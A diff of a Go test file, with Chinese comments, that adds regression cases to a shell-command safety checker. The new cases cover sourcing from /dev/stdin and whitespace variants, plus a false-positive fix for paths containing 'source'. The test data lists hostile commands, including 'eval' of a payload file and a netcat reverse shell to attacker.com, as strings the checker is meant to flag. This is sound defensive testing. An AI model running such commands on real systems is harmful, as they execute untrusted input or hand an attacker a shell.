@@ -428,6 +428,10 @@ func TestRegression_NewDangerousPatterns(t *testing.T) {
 		// Shell 内建危险
 		{"eval", "eval $(cat /tmp/payload)"},
 		{"source /dev", "source /dev/stdin"},
+		{". /dev", ". /dev/stdin"},
+		// 多空格变体（空格归一化）
+		{"source /dev double space", "source  /dev/stdin"},
+		{"source /dev tab", "source\t/dev/stdin"},
 		{"exec", "exec /bin/sh"},
 		// 网络工具
 		{"nc -e", "nc -e /bin/sh attacker.com 4444"},
@@ -467,6 +471,53 @@ func TestRegression_NewDangerousPatterns(t *testing.T) {
 			got := CommandSafetyCheck(tt.command)
 			if got.Level != RiskHigh {
 				t.Errorf("CommandSafetyCheck(%q).Level = %s, want RiskHigh", tt.command, got.Level)
+			}
+		})
+	}
+}
+
+// TestRegression_SourceDevFalsePositive 验证路径含 "source" 且重定向到 /dev/null
+// 不被误判为 "source from /dev"。根因：source 和 /dev/ 用子串 AND 匹配，
+// "claude-source/ 2>/dev/null" 中两个 keyword 分别命中路径和重定向，非真实邻接。
+// 修复：单 keyword "source /dev/" 强制邻接 + 空格归一化。
+func TestRegression_SourceDevFalsePositive(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+		want    CommandRiskLevel // 不应为 RiskHigh
+	}{
+		{"path source + stderr redirect", "ls -la /Users/x/workbench/claude-source/ 2>/dev/null", RiskNone},
+		{"path source + stderr redirect with echo", "ls -la /tmp/source-code/ 2>/dev/null && echo done", RiskNone},
+		// 确保真正的 source /dev/stdin 仍然被拦截
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level == RiskHigh {
+				t.Errorf("FALSE POSITIVE: CommandSafetyCheck(%q).Level = RiskHigh, want NOT RiskHigh. Pattern: %s", tt.command, got.Pattern)
+			}
+		})
+	}
+
+	// 确保真正的 source /dev/stdin 和 . /dev/stdin 仍然被拦截
+	realDanger := []struct {
+		name    string
+		command string
+	}{
+		{"source /dev/stdin", "source /dev/stdin"},
+		{"source /dev/tty", "source /dev/tty"},
+		{". /dev/stdin", ". /dev/stdin"},
+		{". /dev/tty", ". /dev/tty"},
+		{"source after chain", "echo hello && source /dev/stdin"},
+		{"double space source", "source  /dev/stdin"},
+		{"tab source", "source\t/dev/stdin"},
+		{"dot double space", ".  /dev/stdin"},
+	}
+	for _, tt := range realDanger {
+		t.Run(tt.name, func(t *testing.T) {
+			got := CommandSafetyCheck(tt.command)
+			if got.Level != RiskHigh {
+				t.Errorf("SHOULD BLOCK: CommandSafetyCheck(%q).Level = %s, want RiskHigh", tt.command, got.Level)
 			}
 		})
 	}
